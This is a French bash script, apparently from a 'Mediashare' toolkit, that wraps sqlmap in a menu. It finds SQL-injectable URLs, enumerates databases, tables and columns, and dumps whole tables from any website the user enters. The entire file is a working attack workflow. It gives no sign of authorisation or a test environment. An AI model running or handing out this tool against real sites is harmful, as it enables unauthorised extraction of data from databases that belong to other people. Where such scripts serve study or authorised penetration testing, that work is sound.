#!/bin/bash

# Author:Mediashare - Marquand Thibault
# Site:Mediashare.fr

# Prérequis :
#   - Curl
#   - Git
#   - Compte GitLab

echo ""
echo "----------------------------------------------------------------------------"
echo -e "------ Outil SQLmap de [\033[32mMediashare.fr\033[0m]"
echo "----------------------------------------------------------------------------"
echo ""
echo ""
echo ""

echo -e -n "- \033[31mDécouverte Faille - URL \033[0m [\033[32m1\033[0m]   "
echo ""
echo -e -n "- \033[31mOuverture Base\033[0m [\033[32m2\033[0m]   "
echo ""
echo -e -n "- \033[31mOuverture Table\033[0m [\033[32m3\033[0m]   "
echo ""
echo -e -n "- \033[31mOuverture Colonnes\033[0m [\033[32m4\033[0m]   "
echo ""
echo -e -n "- \033[31mDump File\033[0m [\033[32m5\033[0m]   "
echo ""
echo -e -n "Quitter l'[\033[31mOutils\033[0m] MediaDev [\033[32mq\033[0m] "
echo ""
echo -e -n "Choississez la fonction voulu :"
read FUNCTION


if [ "$FUNCTION" = "1" ]
then
    echo -e -n "Rentrer l'url du site (avec dans l'url .php?id=23 par exemple) :"
    read URL
    python tools/sqlmap/sqlmap.py -u $URL --dbs
    echo -e -n "site : $URL"
    bash tools/sqlmap/start.sh
fi


if [ "$FUNCTION" = "2" ]
then
    echo -e -n "Rentrer l'url du site (avec dans l'url .php?id=23 par exemple) :"
    read URL
    echo -e -n "Rentrer la Base du site $URL :"
    read BASE
    python tools/sqlmap/sqlmap.py -u $URL -D $BASE --tables
    echo -e -n "site : $URL"
    echo ""
    echo -e -n "Base : $BASE"
    bash tools/sqlmap/start.sh
fi

if [ "$FUNCTION" = "3" ]
then
    echo -e -n "Rentrer l'url du site (avec dans l'url .php?id=23 par exemple) :"
    read URL
    echo -e -n "Rentrer la Base du site $URL :"
    read BASE
    echo -e -n "Rentrer la Table de la base $BASE :"
    read TABLE
    python tools/sqlmap/sqlmap.py -u $URL -D $BASE -T $TABLE --columns
    echo -e -n "site : $URL"
    echo ""
    echo -e -n "Base : $BASE"
    echo ""
    echo -e -n "Table : $TABLE"
    bash tools/sqlmap/start.sh
fi

if [ "$FUNCTION" = "4" ]
then
    echo -e -n "Rentrer l'url du site (avec dans l'url .php?id=23 par exemple) :"
    read URL
    echo -e -n "Rentrer la Base du site $URL :"
    read BASE
    echo -e -n "Rentrer la Table de la base $BASE :"
    read TABLE
    echo -e -n "Rentrer la Colonne de la table $TABLE :"
    read COLUMNS
    python tools/sqlmap/sqlmap.py -u $URL -D $BASE -T $TABLE -C $COLUMNS
    echo -e -n "site : $URL"
    echo ""
    echo -e -n "Base : $BASE"
    echo ""
    echo -e -n "Table : $TABLE"
    echo ""
    echo -e -n "Colonne : $COLUMNS"
    bash tools/sqlmap/start.sh
fi

if [ "$FUNCTION" = "5" ]
then
    echo -e -n "Rentrer l'url du site (avec dans l'url .php?id=23 par exemple) :"
    read URL
    echo -e -n "Rentrer la Base du site $URL :"
    read BASE
    echo -e -n "Dump file for $URL (Table):"
    read DUMP
    python tools/sqlmap/sqlmap.py -u $URL -D $BASE -T $DUMP --dump
    echo -e -n "site : $URL"
    echo ""
    echo -e -n "Base : $BASE"
    echo ""
    echo -e -n "Table : $DUMP"
    echo ""
    bash tools/sqlmap/start.sh
fi

if [ "$FUNCTION" = "q" ]
then
   bash MediaDev-Start.sh
fi

